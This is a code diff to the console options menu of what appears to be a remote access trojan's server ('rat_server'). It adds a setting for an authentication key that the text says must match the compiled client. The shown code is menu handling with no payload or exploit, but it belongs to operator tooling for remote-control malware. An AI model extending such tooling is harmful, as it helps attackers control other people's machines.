@@ -176,13 +176,18 @@ def show_options_panel(port, host, buffer_size, max_clients, client_sockets, han
         print_banner()
         
         print(f"{Fore.CYAN}=== OPTIONS ==={Style.RESET_ALL}\n")
+        # Import AUTH_KEY from rat_server
+        from rat_server import AUTH_KEY
+        
         print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Port: {Fore.CYAN}{port}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Host: {Fore.CYAN}{host}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}3.{Style.RESET_ALL} Buffer Size: {Fore.CYAN}{buffer_size}{Style.RESET_ALL} bytes")
         print(f"{Fore.YELLOW}4.{Style.RESET_ALL} Max Clients: {Fore.CYAN}{max_clients}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}5.{Style.RESET_ALL} {Fore.GREEN}Back to Main Menu{Style.RESET_ALL}")
+        auth_status = f"{Fore.GREEN}Set{Style.RESET_ALL}" if AUTH_KEY else f"{Fore.RED}Not Set{Style.RESET_ALL}"
+        print(f"{Fore.YELLOW}5.{Style.RESET_ALL} Authentication Key: {auth_status}")
+        print(f"{Fore.YELLOW}6.{Style.RESET_ALL} {Fore.GREEN}Back to Main Menu{Style.RESET_ALL}")
         
-        choice = input(f"\n{Fore.YELLOW}Enter option number {Fore.LIGHTBLUE_EX}[1-5]{Fore.YELLOW}: {Style.RESET_ALL}")
+        choice = input(f"\n{Fore.YELLOW}Enter option number {Fore.LIGHTBLUE_EX}[1-6]{Fore.YELLOW}: {Style.RESET_ALL}")
         
         # Process option choice
         if choice == "1":
@@ -276,6 +281,31 @@ def show_options_panel(port, host, buffer_size, max_clients, client_sockets, han
             time.sleep(1)  # Brief pause to show the message
         
         elif choice == "5":
+            # Authentication Key option
+            clear_screen()
+            print_banner()
+            print(f"{Fore.CYAN}=== AUTHENTICATION KEY ==={Style.RESET_ALL}\n")
+            
+            if AUTH_KEY:
+                print(f"{Fore.GREEN}Current key: {Fore.CYAN}{AUTH_KEY}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}No authentication key set{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}Enter new authentication key (or press Enter to keep current):{Style.RESET_ALL}")
+            new_key = input(f"{Fore.CYAN}Key: {Style.RESET_ALL}").strip()
+            
+            if new_key:
+                # Update the global AUTH_KEY in rat_server module
+                import rat_server
+                rat_server.AUTH_KEY = new_key
+                print(f"{Fore.GREEN}Authentication key updated successfully!{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}Note: Make sure to use the same key '{new_key}' when compiling the client{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.YELLOW}Authentication key unchanged{Style.RESET_ALL}")
+            
+            time.sleep(3)  # Show message for 3 seconds
+            
+        elif choice == "6":
             if restart_needed:
                 print(f"{Fore.YELLOW}Changes detected! Restarting the server...{Style.RESET_ALL}")
                 # Add your server restart logic here
@@ -286,7 +316,7 @@ def show_options_panel(port, host, buffer_size, max_clients, client_sockets, han
             else:
                 return port, host, buffer_size, max_clients, restart_needed
         else:
-            print(f"{Fore.RED}Invalid choice. Please enter a number between 1 and 5.{Style.RESET_ALL}")
+            print(f"{Fore.RED}Invalid choice. Please enter a number between 1 and 6.{Style.RESET_ALL}")
             time.sleep(1)  # Brief pause to show the error message
 
 
